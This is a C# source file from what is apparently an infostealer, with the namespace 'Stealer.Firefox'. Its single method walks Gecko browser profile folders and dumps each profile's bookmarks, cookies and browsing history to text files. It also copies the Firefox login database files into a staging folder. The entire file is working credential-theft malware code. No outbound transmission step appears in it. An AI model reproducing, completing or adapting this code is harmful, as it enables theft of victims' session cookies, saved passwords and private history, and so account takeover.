using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            foreach (string path in Paths.sGeckoBrowserPaths)
            {
                try
                {
                    string name = new DirectoryInfo(path).Name;
                    string bSavePath = sSavePath + "\\" + name;

                    if (Directory.Exists(Paths.appdata + path + "\\Profiles"))
                    {
                        Directory.CreateDirectory(bSavePath);
                        List<Bookmark> bookmarks = Firefox.cBookmarks.Get(Paths.appdata + path); // Read all Firefox bookmarks
                        List<Cookie> cookies = Firefox.cCookies.Get(Paths.appdata + path); // Read all Firefox cookies
                        List<Site> history = Firefox.cHistory.Get(Paths.appdata + path); // Read all Firefox history

                        cBrowserUtils.WriteBookmarks(bookmarks, bSavePath + "\\Bookmarks.txt");
                        cBrowserUtils.WriteCookies(cookies, bSavePath + "\\Cookies.txt");
                        cBrowserUtils.WriteHistory(history, bSavePath + "\\History.txt");
                        // Copy all Firefox logins
                        Firefox.cLogins.GetDBFiles(Paths.appdata + path + "\\Profiles\\", bSavePath);
                    }
                }
                catch (Exception ex) { Console.WriteLine(ex); }
            }
        }
    }
}
